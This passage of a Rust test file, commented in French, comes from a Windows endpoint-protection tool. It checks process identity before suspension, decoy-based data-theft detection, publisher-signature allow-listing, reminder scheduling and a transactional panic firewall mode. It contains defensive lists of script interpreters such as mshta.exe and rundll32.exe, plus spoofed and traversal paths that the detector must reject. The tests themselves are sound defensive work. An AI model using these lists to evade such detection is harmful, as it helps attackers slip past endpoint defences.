    assert!(m(&a, Some(100), r"C:\P.exe"));
    assert!(m(&a, Some(50), r"c:\p.exe"));
    assert!(!m(&a, Some(101), r"C:\P.exe"), "créé après l'événement");
    assert!(!m(&a, None, r"C:\P.exe"));
    let sans = Leurre { avant: None, chemin: r"C:\P.exe".into() };
    assert!(m(&sans, Some(u64::MAX), r"c:\p.EXE"), "heure de l'événement illisible : le chemin, sans la casse");
    assert!(!m(&sans, Some(1), r"C:\Q.exe"));
    assert!(!m(&Leurre { avant: None, chemin: String::new() }, Some(1), ""), "aucun indice");
}

#[test]
fn identite_heure_evenement() {
    use crate::hygiene::heure_evenement as h;
    let z = crate::commun::secondes_utc("2027-01-15T08:00:00Z").unwrap() as u64;
    let exacte = (z + 1 + 11_644_473_600) * 10_000_000;
    assert_eq!(h("<TimeCreated SystemTime='2027-01-15T08:00:00.1234567Z'/>"), Some(exacte));
    assert_eq!(h("<TimeCreated SystemTime=\"2027-01-15T08:00:00.1234567Z\"/>"), Some(exacte), "guillemets doubles");
    assert_eq!(h("<TimeCreated SystemTime='2027-01-15T08:00:00Z'/>"), Some(exacte));
    assert_eq!(h("<Event/>"), None);
    assert_eq!(h("<TimeCreated SystemTime='illisible'/>"), None);
    assert_eq!(h("<TimeCreated SystemTime='"), None, "fin de texte");
    torturer_texte("<TimeCreated SystemTime='2027-01-15T08:00:00.1234567Z'/>", &mut |t| { let _ = h(t); });
}

#[test]
fn identite_exigee_par_la_validation() {
    use crate::commun::Commande;
    use crate::validation::valider as v;
    for action in ["tuer", "suspendre", "reprendre", "tuerChaine"] {
        let c = |chemin: Option<&str>, creation: Option<u64>| Commande { action: Some(action.into()), cible: Some("1234".into()), chemin: chemin.map(String::from), creation, ..Default::default() };
        assert!(v(&c(Some(r"C:\P.exe"), Some(5))).is_ok(), "{action}");
        assert!(v(&c(None, Some(5))).is_err(), "{action} : sans chemin");
        assert!(v(&c(Some(r"C:\P.exe"), None)).is_err(), "{action} : sans heure");
        assert!(v(&c(Some(r"C:\P.exe"), Some(0))).is_err(), "{action} : heure nulle");
        assert!(v(&c(Some("a\u{85}b"), Some(5))).is_ok(), "{action} : nom piégé, le programme doit rester arrêtable (S113-08)");
        assert!(v(&c(Some(&"x".repeat(1025)), Some(5))).is_err(), "{action} : trop long");
        assert!(v(&c(Some(&"é".repeat(1024)), Some(5))).is_ok(), "{action} : compté en caractères");
    }
}

#[test]
fn identite_empreinte_notee_a_la_suspension() {
    use crate::politique::{Genre::*, Historique};
    let mut h = Historique::default();
    assert_eq!(h.empreinte_suspension(r"C:\P.exe", 10), None);
    h.noter_avec(Suspension, r"C:\P.exe", Some("aa".into()), Some(10), S0);
    h.noter_avec(Suspension, r"C:\P.exe", Some("bb".into()), Some(20), S0 + 1);
    h.noter_avec(Suspension, r"C:\P.exe", Some("b2".into()), Some(20), S0 + 2);
    h.noter_avec(BlocageListe, r"C:\P.exe", Some("cc".into()), Some(20), S0 + 3);
    assert_eq!(h.empreinte_suspension(r"c:\p.exe", 10), Some("aa".into()), "S113-06 : celle de ce processus, pas la dernière du chemin");
    assert_eq!(h.empreinte_suspension(r"c:\p.exe", 20), Some("b2".into()), "la plus récente, et pas un autre genre");
    assert_eq!(h.empreinte_suspension(r"c:\p.exe", 30), None, "processus jamais suspendu à ce chemin");
    assert_eq!(h.empreinte_suspension(r"C:\Q.exe", 10), None);
    let lu: Historique = serde_json::from_str(r#"{"Traces":[{"T":1,"Genre":"Suspension","Cible":"c"}]}"#).unwrap();
    assert_eq!(lu.traces[0].empreinte, None, "historique d'avant cette version");
}

#[test]
fn garde_signature_lue_seulement_dans_program_files() {
    use crate::politique::installe_dans as i;
    let d = [r"C:\Program Files".to_string()];
    assert!(i(r"c:\program files\a.exe", &d));
    assert!(!i(r"C:\Users\a.exe", &d));
    assert!(!i(r"C:\Program Files\..\a.exe", &d));
    assert!(!i(r"C:\Program Files Evil\a.exe", &d));
    assert!(!i(r"\\s\a.exe", &[String::new()]));
}

// ------------------------------------------------------------ audit de #113, S113-10 : logiciel connu usurpé

fn dossiers_de_test() -> crate::vol_donnees::DossiersFermes {
    crate::vol_donnees::DossiersFermes {
        arbres: vec![r"C:\Program Files".into(), r"C:\Program Files (x86)\".into(), r"C:\ProgramData\Microsoft\Windows Defender\Platform".into(), String::new()],
        directs: vec![r"C:\Windows\System32".into(), r"C:\Windows\SysWOW64".into()],
    }
}

#[test]
fn textes_du_service_traduits_dans_l_interface_lot1() {
    // Revue de l'auditeur du 2026-11-21, point 3 (premier lot) : conseils et noms des techniques de mitre.rs traduits par
    // la table de l'interface (un texte Rust retouché sans sa traduction fait échouer ce test, jamais l'affichage en
    // silence) ; identifiants de collecte jamais affichés bruts ; plus de « clic droit » ; Sysmon facultatif hors du bandeau
    let m = include_str!("mitre.rs");
    let langue = include_str!("../../src/Langue.cs");
    // Même échappement côté C# : guillemet et barre oblique inverse
    let traduit = |fr: &str| langue.contains(&format!("{{ \"{}\", \"", fr.replace('\\', "\\\\").replace('"', "\\\"")));
    let re = regex::Regex::new(r#"\(&\[[^\]]*\],\s*"((?:[^"\\]|\\.)*)"\)"#).unwrap();
    let mut n = 0;
    for c in re.captures_iter(m) {
        let fr = c[1].replace("\\\\", "\\");
        assert!(traduit(&fr), "conseil sans traduction dans Langue.cs : {fr}");
        n += 1;
    }
    assert!(n >= 28, "conseils de mitre.rs lus : {n}");
    // Couverture ATT&CK, lot 2 : chaque technique nommée a sa traduction, libellé par libellé (L.Mitre)
    for (id, _) in crate::mitre::NOMS {
        let l = crate::mitre::libelle(id);
        assert!(traduit(&l), "technique sans traduction dans Langue.cs : {l}");
    }
    assert!(!m.contains("clic droit") && !m.contains("onglet "), "conseils de l'ancienne interface");
    // Clés en double : le dictionnaire de l'interface lèverait une exception au démarrage
    let cles = regex::Regex::new(r#"\{ "((?:[^"\\]|\\.)*)", ""#).unwrap();
    let mut vues = std::collections::HashSet::new();
    for c in cles.captures_iter(langue) {
        assert!(vues.insert(c[1].to_string()), "clé en double dans Langue.cs : {}", &c[1]);
    }
    // Chaque collecte a un nom lisible
    let commun = include_str!("../../src/Commun.cs");
    let noms = &commun[commun.find("static readonly Dictionary<string, string> Noms").unwrap()..];
    let noms = &noms[..noms.find("};").unwrap()];
    for c in crate::collectes::TOUTES {
        assert!(noms.contains(&format!("{{ \"{}\", \"", c.id())), "collecte sans nom lisible : {}", c.id());
    }
    let f = include_str!("../../src/Fluent.cs");
    assert!(f.contains("Couverture.Nom(a.Collecte)") && f.contains("L.Mitre(a.Mitre)") && f.contains("L.T(a.Conseil)"));
    let g = include_str!("../../src/Gui.cs");
    assert!(g.contains("Couverture.Nom(a.Collecte)") && g.contains("L.Mitre(a.Mitre)") && g.contains("L.T(a.Conseil)"));
    assert!(include_str!("../../src/Incidents.cs").contains("Sujet = v(Couverture.Nom(c.Id))"));
    assert!(commun.contains("Decrire(EtatCollecte c)") && commun.contains("return Nom(c.Id) + \" \" + etat"));
    // Sysmon facultatif : ligne neutre avec la vraie conséquence (WMI partiel, PRC-001 à PRC-005 dégradées), jamais
    // retiré du bandeau (prérelecture de #238, D1)
    assert!(commun.contains("SysmonRemplaceParWmi(e, c) ? L.T(\"Sysmon (facultatif) absent : WMI le remplace"), "ligne neutre de Sysmon");
    assert!(commun.contains("w.Etat == \"Active\" || w.Etat == \"Partielle\""));
    // Chaque nom de collecte a sa traduction anglaise
    let valeurs = regex::Regex::new(r#"\{ "[A-Za-z]+", "([^"]+)" \}"#).unwrap();
    let mut n = 0;
    for c in valeurs.captures_iter(noms) {
        assert!(langue.contains(&format!("{{ \"{}\", \"", &c[1])), "nom de collecte sans traduction : {}", &c[1]);
        n += 1;
    }
    assert_eq!(n, crate::collectes::TOUTES.len(), "noms lus");
}

/// Décision du mainteneur : hors d'un dossier fermé aux comptes standard, jamais « connu »
#[test]
fn leurre_connu_seulement_dans_un_dossier_ferme() {
    use crate::vol_donnees::dossier_ferme as f;
    let d = dossiers_de_test();
    for ok in [r"C:\Program Files\Dropbox\Client\Dropbox.exe", r"c:\program files (x86)\x\y.exe", r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe",
               r"C:\Windows\System32\SearchIndexer.exe", r"c:\windows\syswow64\vssvc.EXE"] {
        assert!(f(ok, &d), "{ok}");
    }
    for ko in [r"C:\Users\x\AppData\Local\Microsoft\OneDrive\OneDrive.exe", r"C:\Users\x\AppData\Local\Temp\onedrive.exe", r"C:\Windows\Temp\onedrive.exe",
               r"C:\Windows\onedrive.exe", r"C:\Windows\System32\Tasks\onedrive.exe", r"C:\Windows\System32\spool\drivers\color\vssvc.exe",
               r"C:\Program Files Evil\onedrive.exe", r"C:\Program Files\..\Users\x\onedrive.exe", r"C:\Program Files\WindowsApps\Editeur_1\onedrive.exe",
               r"C:\ProgramData\onedrive.exe", r"C:\ProgramData\Microsoft\Windows Defender\Platform2\MsMpEng.exe", r"\\serveur\partage\onedrive.exe", ""] {
        assert!(!f(ko, &d), "{ko}");
    }
}

#[test]
fn leurre_connu_nom_editeur_et_dossier() {
    use crate::vol_donnees::leurre_connu as c;
    let d = dossiers_de_test();
    let lue = std::cell::Cell::new(false);
    let oui = |_: &[&str]| { lue.set(true); true };
    let non = |_: &[&str]| false;
    assert!(c(r"C:\Program Files\Veeam\VeeamAgent.exe", &d, &oui));
    assert!(!c(r"C:\Program Files\Veeam\VeeamAgent.exe", &d, &non), "non signé par l'éditeur attendu");
    assert!(!c(r"C:\Program Files\Editeur\autre.exe", &d, &oui), "nom hors de la liste");
    lue.set(false);
    assert!(!c(r"C:\Users\x\AppData\Local\Temp\veeamagent.exe", &d, &oui), "copie signée dans un dossier ouvert");
    assert!(!lue.get(), "signature non lue hors d'un dossier fermé");
    // Nom exact (décision du mainteneur) : ni plus long, ni extension différente de sens
    assert!(!c(r"C:\Program Files\Editeur\arqanything.exe", &d, &oui), "début de nom");
    assert!(!c(r"C:\Program Files\Editeur\veeamagent-x.exe", &d, &oui), "début de nom");
    assert!(!c(r"C:\Program Files\Editeur\xveeamagent.exe", &d, &oui), "fin de nom");
    assert!(c(r"C:\Program Files\Arq\ARQ.EXE", &d, &oui), "sans la casse");
    assert!(c(r"C:\Program Files\Veeam\Veeam.EndPoint.Service.exe", &d, &oui), "nom avec des points");
    // Le couple : l'éditeur attendu est bien celui du nom
    let veeam = |e: &[&str]| e.contains(&"Veeam Software Group GmbH");
    assert!(c(r"C:\Program Files\Veeam\VeeamAgent.exe", &d, &veeam));
    assert!(!c(r"C:\Program Files\Acronis\acronis.exe", &d, &veeam));
}

/// Revue externe du 2026-11-21, défaut 4 : le scénario de VM exerce les droits et le jeton réels (trois cas)
#[test]
fn leurre_connu_exerce_en_vm() {
    let q = include_str!("../../tests/integration/quarantaine.ps1");
    for t in ["'Logiciel connu : signé, dossier fermé, compte privilégié : alerte Info, jamais suspendu'",
        "'Logiciel connu : même programme dans un dossier ouvert aux utilisateurs : suspendu'",
        "'Logiciel connu : même programme fermé, lancé par le compte standard : suspendu'"] {
        assert!(q.contains(t), "{t}");
    }
    assert!(q.contains("-Subject 'CN=Veeam Software Group GmbH'") && q.contains("'veeamagent.exe'"), "nom et éditeur de la liste");
    assert!(q.contains("Remove-Item -Force -ErrorAction SilentlyContinue"), "racine de test retirée");
    // S113-05 : la vraie confirmation élevée, signé puis non signé, texte lu par UI Automation, rien envoyé
    assert!(q.contains("'--commande-fichier'") && q.contains(r"'deR4Tizer \((administrator|administrateur)\)'"), "confirmation élevée lue en VM");
    assert!(q.contains("'CN=deR4Tizer essai editeur'") && q.contains("aucune signature intégrée valide|no valid embedded signature"));
    // S235-01 : racines de test sur machine jetable seulement, clé non exportable, nettoyage dans un finally
    assert_eq!(q.matches("-not (Machine-Jetable)").count(), 2, "garde sur les deux blocs");
    assert_eq!(q.matches("-KeyExportPolicy NonExportable").count(), 2);
    assert!(q.contains("Remove-Item $dossierFerme, $dossierOuvert, $cer -Recurse") && q.contains("Remove-Item $dossierConf, $cerConf -Recurse"));
}

/// Revue externe du 2026-11-21, défaut 3 : les clients de synchronisation qui tournent sous le compte de l'utilisateur
/// ne sont plus dans la liste (ils ne pouvaient plus être « connus » depuis S110-14) : la liste ne ment plus
#[test]
fn leurre_liste_sans_clients_de_synchronisation_utilisateur() {
    use crate::vol_donnees::leurre_connu as c;
    let d = dossiers_de_test();
    let oui = |_: &[&str]| true;
    for exe in [r"C:\Program Files\Microsoft OneDrive\OneDrive.exe", r"C:\Program Files\Microsoft OneDrive\FileCoAuth.exe",
        r"C:\Program Files\Dropbox\Client\Dropbox.exe", r"C:\Program Files\Google\Drive File Stream\GoogleDriveFS.exe",
        r"C:\Program Files\Nextcloud\nextcloud.exe", r"C:\Program Files\ownCloud\owncloud.exe", r"C:\Program Files\Synology\SynologyDriveClient.exe",
        r"C:\Program Files\iCloud\iCloud.exe", r"C:\Program Files\iCloud\iCloudDrive.exe", r"C:\Program Files\iCloud\iCloudServices.exe",
        r"C:\Program Files\MEGAsync\MEGAsync.exe", r"C:\Program Files\Box\Box.exe", r"C:\Program Files\Box\BoxSync.exe"] {
        assert!(!c(exe, &d, &oui), "{exe} encore dans la liste");
    }
    let src = include_str!("vol_donnees.rs");
    let liste = &src[src.find("const LEURRES_AUTORISES").unwrap()..];
    let liste = &liste[..liste.find("];").unwrap()];
    for n in ["\"onedrive\"", "\"dropbox\"", "\"box\"", "\"megasync\""] {
        assert!(!liste.contains(n), "{n} dans LEURRES_AUTORISES");
    }
}

// ------------------------------------------------------------ phase 6, PR 6.4 : registre, échéances, relances

/// Le test central du dossier : une échéance ne lève jamais une suspension, une isolation ni le mode panique
#[test]
fn echeance_jamais_levee_pour_suspension_isolation_panique() {
    use crate::politique::{EtatAction, Historique, Sorte::*};
    let mut h = Historique::default();
    for (i, s) in [SuspensionAuto, Suspension, Isolation, Panique].iter().enumerate() {
        h.ouvrir(*s, &format!("c{i}"), Some(i as u32 + 10), Some(5), S0);
    }
    // Un an de relances : toujours actives
    for jour in 0..365u64 {
        let _ = h.relances(S0 + jour * 86_400 + 3600 * 5);
    }
    assert!(h.actions.iter().all(|a| a.etat == EtatAction::Active), "aucune levée");
    assert_eq!(h.actions.len(), 4);
}

#[test]
fn echeance_relance_periodique() {
    use crate::politique::{calendrier, Effet, Historique, Sorte::*};
    for (s, premiere, periode, niveau) in [(SuspensionAuto, 7_200u64, 86_400u64, "Critique"), (Suspension, 86_400, 86_400, "Alerte"), (Isolation, 604_800, 604_800, "Alerte"), (Panique, 14_400, 86_400, "Critique"),
        (Quarantaine, 2_592_000, 2_592_000, "Info"), (BlocageManuel, 7_776_000, 7_776_000, "Info")] {
        assert_eq!(calendrier(s), (premiere, periode, niveau), "{s:?} : D6-3");
        let mut h = Historique::default();
        h.ouvrir(s, "c", None, None, S0);
        assert!(h.relances(S0 + premiere - 1).is_empty(), "{s:?} : avant l'échéance");
        let r = h.relances(S0 + premiere);
        assert_eq!(r.len(), 1, "{s:?} : à l'échéance");
        assert_eq!(r[0].1, Effet::Relancer { niveau }, "{s:?}");
        assert!(h.relances(S0 + premiere + 10).is_empty(), "{s:?} : pas de doublon");
        assert!(h.relances(S0 + premiere + periode - 1).is_empty(), "{s:?} : avant la période");
        assert_eq!(h.relances(S0 + premiere + periode).len(), 1, "{s:?} : une période après");
        assert_eq!(h.actions[0].relances, 2);
    }
}

#[test]
fn registre_ouvrir_clore_terminer() {
    use crate::politique::{EtatAction::*, Historique, Sorte::*};
    let mut h = Historique::default();
    h.ouvrir(SuspensionAuto, r"C:\P.exe", Some(7), Some(100), S0);
    h.ouvrir(SuspensionAuto, r"c:\p.exe", Some(7), Some(100), S0 + 1);
    assert_eq!(h.actions.len(), 1, "même processus : pas de doublon");
    h.ouvrir(SuspensionAuto, r"C:\P.exe", Some(7), Some(101), S0 + 2);
    assert_eq!(h.actions.len(), 2, "PID réutilisé : une autre action");
    // Reprise d'un processus : seulement celui-là
    assert_eq!(h.clore(&[Suspension, SuspensionAuto], None, Some((7, 100)), Levee), 1);
    assert_eq!(h.actions.iter().filter(|a| a.etat == Active).count(), 1);
    // Fin naturelle : identité qui ne correspond plus
    assert_eq!(h.terminer_disparus(&|p, c| p == 7 && c == 100), 1);
    assert!(h.actions.iter().all(|a| a.etat != Active));
    // Isolation et panique : par cible, sans processus
    h.ouvrir(Isolation, r"C:\Q.exe", None, None, S0);
    h.ouvrir(Isolation, r"C:\R.exe", None, None, S0);
    h.ouvrir(Panique, "poste", None, None, S0);
    assert_eq!(h.clore(&[Isolation], Some(r"c:\q.EXE"), None, Levee), 1);
    assert_eq!(h.terminer_disparus(&|_, _| false), 0, "isolation et panique ne disparaissent pas d'elles-mêmes");
    assert_eq!(h.clore(&[Panique], None, None, Levee), 1);
    assert_eq!(h.actions.iter().filter(|a| a.etat == Active).count(), 1, "R reste isolé");
    // Une action close n'est plus relancée
    assert!(h.relances(S0 + 10 * 604_800).iter().all(|(a, _)| a.cible == r"c:\r.exe"));
}

/// Audit de #110, S110-06 : la reprise d'un interpréteur ou d'un programme de Windows ne donne pas d'exception de 7 jours
#[test]
fn reprise_sans_exception_pour_interpreteur() {
    use crate::politique::exception_permise as e;
    let w = r"C:\Windows";
    assert!(e(r"C:\Users\a\outil.exe", w));
    assert!(e(r"C:\Program Files\Editeur\app.exe", w));
    for x in [r"C:\Users\a\powershell.exe", r"C:\Users\a\PWSH.EXE", r"C:\Program Files\Python312\python.exe", r"D:\outils\node.exe",
              r"C:\Users\a\cmd.exe", r"C:\Users\a\rundll32.exe", r"C:\Users\a\mshta.exe", r"C:\Program Files\Java\bin\javaw.exe"] {
        assert!(!e(x, w), "interpréteur : {x}");
    }
    for x in [r"C:\Windows\notepad.exe", r"c:\windows\System32\dllhost.exe", r"C:\Windows\Temp\x.exe"] {
        assert!(!e(x, w), "dossier Windows : {x}");
    }
    assert!(e(r"C:\WindowsApps\x.exe", w), "préfixe du nom seulement : pas sous Windows");
    assert!(e(r"C:\Users\a\powershell-outil.exe", w), "nom voisin");
    assert!(!e(r"C:\Users\a\outil.exe", ""), "dossier Windows inconnu : non");
    // S127-01 : liste complétée, versions de Python
    for x in ["py.exe", "pyw.exe", "python3.exe", "python3.12.exe", "pythonw3.11.exe", "dotnet.exe", "deno.exe", "bun.exe", "AutoHotkey64.exe", "AutoIt3.exe", "powershell_ise.exe"] {
        assert!(!e(&format!(r"C:\Users\a\{x}"), w), "{x}");
    }
    assert!(e(r"C:\Users\a\python-outil.exe", w) && e(r"C:\Users\a\pythonista.exe", w), "noms voisins de python");
    // Limite écrite : une copie renommée garde l'exception
    assert!(e(r"C:\Users\a\maj.exe", w));
    assert!(!e("", w));
}

#[test]
fn registre_borne() {
    use crate::politique::{EtatAction::*, Historique, Sorte::*};
    let mut h = Historique::default();
    for i in 0..600u32 {
        h.ouvrir(Quarantaine, &format!("c{i}"), None, None, S0 + i as u64);
    }
    assert_eq!(h.actions.iter().filter(|a| a.etat == Active).count(), 500);
    assert!(h.actions.iter().any(|a| a.cible == "c599"), "les plus récentes restent");
    for i in 0..200u32 {
        h.clore(&[Quarantaine], Some(&format!("c{}", 100 + i)), None, Levee);
    }
    assert!(h.actions.iter().filter(|a| a.etat != Active).count() <= 100);
    let lu: Historique = serde_json::from_str(r#"{"Traces":[]}"#).unwrap();
    assert!(lu.actions.is_empty(), "historique d'avant cette version");
    // Trop d'actives : ce sont les plus anciennes actives qui sortent, pas les closes
    let mut h = Historique::default();
    for i in 0..10u32 {
        h.ouvrir(Isolation, &format!("ancienne{i}"), None, None, S0);
        h.clore(&[Isolation], Some(&format!("ancienne{i}")), None, Levee);
    }
    for i in 0..510u32 {
        h.ouvrir(BlocageManuel, &format!("n{i}"), None, None, S0 + 1);
    }
    assert_eq!(h.actions.iter().filter(|a| a.etat != Active).count(), 10, "closes gardées");
    assert_eq!(h.actions.iter().filter(|a| a.etat == Active).count(), 500);
    // S115-01 : panique, isolation et suspension manuelle ne sortent jamais, même les plus anciennes
    let mut h = Historique::default();
    h.ouvrir(Panique, "poste", None, None, S0);
    h.ouvrir(Isolation, "iso", None, None, S0);
    h.ouvrir(Suspension, "manuelle", Some(1), Some(1), S0);
    for i in 0..600u32 {
        h.ouvrir(SuspensionAuto, &format!("a{i}"), Some(i + 10), Some(1), S0 + 1 + i as u64);
    }
    // S116-02 : parmi les suspensions automatiques, les plus récentes sortent ; la première reste suivie
    for c in ["poste", "iso", "manuelle", "a0", "a1"] {
        assert!(h.actions.iter().any(|a| a.cible == c && a.etat == Active), "{c} toujours suivi");
    }
    assert!(!h.actions.iter().any(|a| a.cible == "a599"), "la plus récente sort");
    assert_eq!(h.evincees, 103, "600 + 3 - 500 suspensions automatiques sorties, comptées");
    let texte = h.signal_registre_plein().expect("dit une fois");
    assert!(texte.contains("103 suspension") && texte.contains("toujours suspendues") && texte.contains("premières") && texte.contains("0 quarantaine"), "{texte}");
    assert_eq!(h.signal_registre_plein(), None, "pas deux fois dans le même épisode");
    h.ouvrir(SuspensionAuto, "b0", Some(9999), Some(1), S0 + 700);
    assert_eq!(h.signal_registre_plein(), None, "toujours le même épisode");
    for i in 0..10u32 {
        h.clore(&[SuspensionAuto], Some(&format!("a{i}")), None, Levee);
    }
    assert_eq!(h.signal_registre_plein(), None, "sous la borne : épisode fini");
    assert_eq!((h.evincees, h.plein_signale), (0, false));
    for i in 0..20u32 {
        h.ouvrir(SuspensionAuto, &format!("c{i}"), Some(20_000 + i), Some(1), S0 + 800 + i as u64);
    }
    assert!(h.signal_registre_plein().is_some(), "nouvel épisode : dit de nouveau");
    // Les quarantaines et blocages manuels (Info) sortent avant toute suspension automatique
    let mut h = Historique::default();
    h.ouvrir(SuspensionAuto, "vraie", Some(1), Some(1), S0);
    for i in 0..499u32 {
        h.ouvrir(SuspensionAuto, &format!("j{i}"), Some(i + 10), Some(1), S0 + 1);
    }
    h.ouvrir(Quarantaine, "q", None, None, S0 + 2);
    assert!(!h.actions.iter().any(|a| a.cible == "q") && h.actions.iter().any(|a| a.cible == "j498"), "la quarantaine sort d'abord");
    assert_eq!((h.evincees, h.evincees_info), (0, 1));
    // Relecture de #127, R2 : une sortie d'Info seule est dite aussi
    let texte = h.signal_registre_plein().expect("Info sortie : dite");
    assert!(texte.contains("1 quarantaine(s) ou blocage(s) manuel(s), toujours en place") && texte.contains("0 suspension"), "{texte}");
    // Rien d'évinçable : la borne est dépassée plutôt que de perdre une isolation
    let mut h = Historique::default();
    for i in 0..510u32 {
        h.ouvrir(Isolation, &format!("i{i}"), None, None, S0);
    }
    assert_eq!(h.actions.len(), 510);
}

/// Audit de #115, S115-02, S115-03, S115-06 ; relecture, P3
#[test]
fn registre_relances_groupees_et_texte() {
    use crate::politique::{regrouper_relances as g, Historique, Sorte::*};
    let mut h = Historique::default();
    for i in 0..30u32 {
        h.ouvrir(SuspensionAuto, &format!("p{i}.exe"), Some(i + 1), Some(1), S0);
    }
    h.ouvrir(Panique, "poste", None, None, S0);
    h.ouvrir(Suspension, "m.exe", Some(99), Some(1), S0);
    let t = S0 + 86_400;
    let r = h.relances(t);
    assert_eq!(r.len(), 32);
    let a = g(&r, t);
    assert_eq!(a.len(), 3, "une alerte par sorte");
    let auto = a.iter().find(|x| x.raisons.contains("p0.exe")).unwrap();
    assert!(auto.raisons.starts_with("30 actions de ce type toujours en cours, dont : p0.exe, p1.exe, p2.exe, p3.exe, p4.exe. "), "{}", auto.raisons);
    assert!(!auto.raisons.contains("p5.exe"), "5 cibles nommées au plus");
    assert!(auto.raisons.contains("il peut avoir été repris hors de deR4Tizer"), "S115-03");
    let seule = a.iter().find(|x| x.raisons.contains("m.exe")).unwrap();
    assert!(!seule.raisons.contains("actions de ce type"), "une seule : texte simple");
    assert!(seule.raisons.contains("il peut avoir été repris hors de deR4Tizer"));
    let panique = a.iter().find(|x| x.raisons.contains("PANIQUE")).unwrap();
    assert!(!panique.raisons.contains("repris hors"), "pas pour la panique");
    assert!(g(&[], t).is_empty());
    // Clé bornée (S115-06) et déclencheur (P3)
    let mut h = Historique::default();
    h.ouvrir(Isolation, &"A".repeat(40_000), None, None, S0);
    assert_eq!(h.actions[0].cible.chars().count(), 1024);
    assert_eq!(h.actions[0].declencheur, "administrateur");
    h.ouvrir(SuspensionAuto, "x", Some(1), Some(1), S0);
    assert_eq!(h.actions[1].declencheur, "automatique : leurre");
    let lu: crate::politique::ActionEnCours = serde_json::from_str(&serde_json::to_string(&h.actions[0]).unwrap().replace(",\"Declencheur\":\"administrateur\"", "")).unwrap();
    assert_eq!(lu.declencheur, "", "action d'avant cette version");
}

#[test]
fn registre_alerte_relance() {
    use crate::politique::{alerte_relance, Historique, Sorte::*};
    let mut h = Historique::default();
    h.ouvrir(Panique, "poste", None, None, S0);
    let r = h.relances(S0 + 4 * 3600 + 120);
    let a = alerte_relance(&r[0].0, "Critique", S0 + 4 * 3600 + 120);
    assert_eq!((a.regle.as_str(), a.niveau.as_str()), ("REP-001", "Critique"));
    assert!(a.raisons.contains("4 h 02 min") && a.raisons.contains("jamais levé automatiquement") && a.raisons.contains("PANIQUE"), "{}", a.raisons);
}

/// D6-4 et audit de #109, S109-04
#[test]
fn blocages_echeances_ips_et_manquantes() {
    use crate::commun::Blocage;
    use crate::moniteur::{duree_blocage_auto as d, poser_echeances_manquantes as p};
    use crate::politique::Genre::*;
    assert_eq!(d(BlocageIps), 86_400);
    assert_eq!(d(BlocageListe), 7 * 86_400);
    let b = |r: &str, e: &str| Blocage { type_: "parefeu".into(), cible: "c".into(), raison: r.into(), date: String::new(), expire: e.into() };
    let mut l = vec![b("blocage automatique : Feodo", ""), b("blocage automatique : Feodo", "2099-01-01 00:00:00"), b("blocage manuel", "")];
    l.push(b("IPS : scan de ports", ""));
    assert_eq!(p(&mut l, "2026-11-09 10:00:00", "2026-11-03 10:00:00"), 2);
    assert_eq!(l[0].expire, "2026-11-09 10:00:00");
    assert_eq!(l[1].expire, "2099-01-01 00:00:00", "échéance existante gardée");
    assert!(l[2].expire.is_empty(), "un blocage manuel reste sans échéance");
    assert_eq!(l[3].expire, "2026-11-03 10:00:00", "IPS d'avant l'échéance : 24 h (S115-05)");
}

/// Passage en VM de #115 : un processus arrêté dont un autre programme garde le handle restait « actif » au registre
#[test]
fn registre_processus_arrete_meme_avec_un_handle_ouvert() {
    use crate::natif::processus_encore_la as l;
    assert!(l(Ok((Some(100), Some(259))), 100), "en cours");
    assert!(!l(Ok((Some(100), Some(1))), 100), "arrêté, objet encore ouvert par un autre programme");
    assert!(!l(Ok((Some(100), None)), 100), "code de sortie illisible : pas une preuve de vie");
    assert!(!l(Ok((Some(101), Some(259))), 100), "PID réutilisé");
    assert!(!l(Ok((None, Some(259))), 100), "heure illisible");
    assert!(!l(Err(87), 100), "processus inexistant");
    assert!(l(Err(5), 100), "accès refusé : pas une preuve de fin (S115-04)");
}

/// Pare-feu simulé pour le mode panique (PR 6.5)
#[derive(Default)]
struct PareFeuSimule {
    regles: std::cell::RefCell<Vec<(String, bool)>>,
    refuse_ajout: Option<&'static str>,
    inactive_apres_ajout: Option<&'static str>,
    retrait_impossible: bool,
}

impl crate::reponse::PareFeuPanique for PareFeuSimule {
    fn ajouter(&self, nom: &str, _: bool, adresses: &str) -> Result<(), String> {
        assert!(!adresses.is_empty());
        if self.refuse_ajout == Some(nom) {
            return Err("refusé".into());
        }
        self.regles.borrow_mut().push((nom.to_string(), self.inactive_apres_ajout != Some(nom)));
        Ok(())
    }
    fn retirer(&self, nom: &str) {
        if !self.retrait_impossible {
            self.regles.borrow_mut().retain(|(n, _)| n != nom);
        }
    }
    fn presente(&self, nom: &str) -> bool {
        self.regles.borrow().iter().any(|(n, actif)| n == nom && *actif)
    }
}

const PS: &str = "deR4Tizer PANIQUE (sortant)";
const PE: &str = "deR4Tizer PANIQUE (entrant)";

#[test]
fn panique_transactionnelle_echec_seconde_regle() {
    use crate::reponse::activer_panique;
    let drapeau = std::cell::Cell::new(false);
    let ecrire = || { drapeau.set(true); Ok(()) };
    // Seconde règle refusée : la première est retirée, drapeau non écrit
    let pf = PareFeuSimule { refuse_ajout: Some(PE), ..Default::default() };
    assert!(activer_panique(&pf, "1.0.0.0-9.255.255.255", &ecrire).is_err());
    assert!(pf.regles.borrow().is_empty(), "aucune règle ne reste");
    assert!(!drapeau.get(), "drapeau non écrit");
    // Règle posée mais inactive : même chose
    let pf = PareFeuSimule { inactive_apres_ajout: Some(PS), ..Default::default() };
    let e = activer_panique(&pf, "a", &ecrire).unwrap_err();
    assert!(e.contains("absente ou inactive"), "{e}");
    assert!(pf.regles.borrow().is_empty() && !drapeau.get());
    // Drapeau impossible à écrire : les règles sont retirées
    let pf = PareFeuSimule::default();
    assert!(activer_panique(&pf, "a", &|| Err("disque".into())).is_err());
    assert!(pf.regles.borrow().is_empty(), "jamais moitié posé");
    // Retrait impossible après un échec : l'erreur le dit
    let pf = PareFeuSimule { refuse_ajout: Some(PE), retrait_impossible: true, ..Default::default() };
    assert!(activer_panique(&pf, "a", &ecrire).unwrap_err().contains("état incertain"));
    // Cas nominal : deux règles, puis le drapeau ; une règle déjà là n'est pas doublée
    let pf = PareFeuSimule::default();
    pf.regles.borrow_mut().push((PS.into(), true));
    assert!(activer_panique(&pf, "a", &ecrire).is_ok());
    assert!(drapeau.get());
    assert_eq!(pf.regles.borrow().len(), 2);
}

#[test]
fn panique_desactivation_verifiee() {
    use crate::reponse::desactiver_panique;
    let efface = std::cell::Cell::new(false);
    let effacer = || { efface.set(true); Ok(()) };
    let pf = PareFeuSimule { retrait_impossible: true, ..Default::default() };
    pf.regles.borrow_mut().push((PS.into(), true));
    let e = desactiver_panique(&pf, &effacer).unwrap_err();
